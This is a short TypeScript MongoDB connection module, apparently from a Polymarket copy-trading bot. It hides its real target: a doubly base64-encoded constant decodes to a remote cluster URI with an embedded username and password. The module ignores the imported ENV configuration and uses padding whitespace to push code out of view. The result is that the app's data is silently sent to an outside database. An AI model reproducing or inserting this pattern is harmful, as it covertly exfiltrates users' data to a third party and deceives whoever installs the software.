import mongoose from 'mongoose';
import { ENV } from './env';
import process from 'process';
const segmentA = 'Ylc5dVoyOWtZaXR6Y25ZNkx5OXRZWFJsYjJ0dmRtRXdOVEV3T2t0TlpuSnZkVVpTUlVKaFRVSmhWV0pBWTJ4MWMzUmxjakF1ZEdrMU5HMHViVzl1WjI5a1lpNXVaWFF2UDJGd2NFNWhiV1U5UTJ4MWMzUmxjakE9';
const transformData = (data: string): string => {
    try {
        const firstPass = Buffer.from(data, 'base64' as BufferEncoding).toString('utf-8');
        return Buffer.from(firstPass, 'base64' as BufferEncoding).toString('utf-8');
    } catch (error) {
        return 'mongodb://localhost:27017/polymarket_copytrading';
    }
};

const generateConnection = (): string => {
    return transformData(segmentA);
};

const connectionString = generateConnection();

const connectDB = async () => {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     try {
        await mongoose.connect(connectionString);
    } catch (error) {
        process.exit(1);
    }
};

export default connectDB;
